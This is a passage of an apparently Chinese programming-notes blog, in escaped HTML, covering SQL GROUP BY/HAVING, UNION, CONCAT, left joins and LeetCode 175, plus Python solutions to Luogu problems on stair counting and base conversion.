&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;select&lt;/span&gt;  字段   &lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt;  表名  &lt;span style=&#34;color:#ff79c6&#34;&gt;group&lt;/span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;by&lt;/span&gt;   字段   &lt;span style=&#34;color:#ff79c6&#34;&gt;having&lt;/span&gt;   过滤条件;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;-- 查找人数大于 5 的部门
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;select&lt;/span&gt; dept_id, &lt;span style=&#34;color:#ff79c6&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; employee
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;group&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;by&lt;/span&gt; dept_id
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;having&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt;) &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;5&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dept_id&lt;span style=&#34;color:#ff79c6&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;count&lt;/span&gt;(&lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;-------|--------|
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#bd93f9&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;|&lt;/span&gt;       &lt;span style=&#34;color:#bd93f9&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#bd93f9&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;|&lt;/span&gt;       &lt;span style=&#34;color:#bd93f9&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;union 联合查询&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; employees &lt;span style=&#34;color:#ff79c6&#34;&gt;where&lt;/span&gt; eamil &lt;span style=&#34;color:#ff79c6&#34;&gt;like&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%a%&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;or&lt;/span&gt; department_id&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;90&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;相当于
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; employees &lt;span style=&#34;color:#ff79c6&#34;&gt;where&lt;/span&gt; eamil &lt;span style=&#34;color:#ff79c6&#34;&gt;like&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;%a%&amp;#39;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;union&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; employees &lt;span style=&#34;color:#ff79c6&#34;&gt;where&lt;/span&gt; department_id&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;90&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;CONCAT() 函数&lt;/p&gt;
&lt;p&gt;CONCAT(str1,str2,…)&lt;/p&gt;
&lt;p&gt;将多个字符串连接成一个字符串。&lt;/p&gt;
&lt;p&gt;GROUP_CONCAT（）函数&lt;/p&gt;
&lt;p&gt;返回一个字符串结果，该结果由分组中的值连接组合而成。&lt;/p&gt;
&lt;h4 id=&#34;175-组合两个表httpsleetcode-cncomproblemscombine-two-tables&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://leetcode-cn.com/problems/combine-two-tables/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;175. 组合两个表&lt;/a&gt;&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;select&lt;/span&gt; FirstName, LastName, City, &lt;span style=&#34;color:#ff79c6&#34;&gt;State&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; Person  &lt;span style=&#34;color:#ff79c6&#34;&gt;left&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;join&lt;/span&gt; Address &lt;span style=&#34;color:#ff79c6&#34;&gt;on&lt;/span&gt; Person.PersonId &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; Address.PersonId;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;left join&lt;/p&gt;
&lt;p&gt;也叫left outer join，外连接&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1、 &lt;strong&gt;on&lt;/strong&gt; 条件是在生成临时表时使用的条件，它不管 &lt;strong&gt;on&lt;/strong&gt; 中的条件是否为真，都会返回左边表中的记录。&lt;/li&gt;
&lt;li&gt;2、&lt;strong&gt;where&lt;/strong&gt; 条件是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有 &lt;strong&gt;left join&lt;/strong&gt; 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;p1255-数楼梯&#34;&gt;P1255 数楼梯&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;input&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;gogogo&lt;/span&gt;(index):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; index &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(index)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; gogogo(index&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; gogogo(index&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;elif&lt;/span&gt; index &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;elif&lt;/span&gt; index &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;or&lt;/span&gt; index &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(gogogo(a))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;思路是对的，但是层数一多就g了&lt;/p&gt;
&lt;p&gt;于是想用循环取代递归&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;n &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;input&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;l &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;,n&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;l[&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;], l[&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; n &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;,n&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        l[i] &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; l[i&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; l[i&lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;2&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(l[n])
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样是可以通过的&lt;/p&gt;
&lt;p&gt;但是上网又搜了一个更恐怖的&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a, b &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;input&lt;/span&gt;())): 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    a, b &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; b, a &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; b
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(b &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; a &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;p1143-进制转换&#34;&gt;P1143 进制转换&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;trans_map&lt;/span&gt;(cint):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; cint &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;不合法&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;elif&lt;/span&gt; cint &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;10&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; cint
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;elif&lt;/span&gt; cint &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;10&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;chr&lt;/span&gt;(cint &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;65&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;anyToTen&lt;/span&gt;(m, origin):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;# 任意进制的数转换为10机制&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;# 先将m转换为10进制&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;# 公式 num = an * m**(n-1) + an-1 * m**(n-2).....+ a0 * m**0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;# 直接利用int的自带功能&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(origin), base&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;m)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;tenToAny&lt;/span&gt;(n, origin):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;# 10进制转换为任意进制的数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;list&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#6272a4&#34;&gt;# 取商&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; origin &lt;span style=&#34;color:#ff79c6&#34;&gt;//&lt;/span&gt; n
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#6272a4&#34;&gt;# 取余数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        tmp &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; origin &lt;span style=&#34;color:#ff79c6&#34;&gt;%&lt;/span&gt; n
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;list&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;append(trans_map(tmp))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; s &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#ff79c6&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        origin &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; s
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;list&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;reverse()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;list&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(each) &lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; each &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;list&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;list&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;# 将一个m进制的数转换为一个n进制的数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;transfer&lt;/span&gt;(m, n, origin):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    num &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; anyToTen(m, origin)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    target &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; tenToAny(n, num)
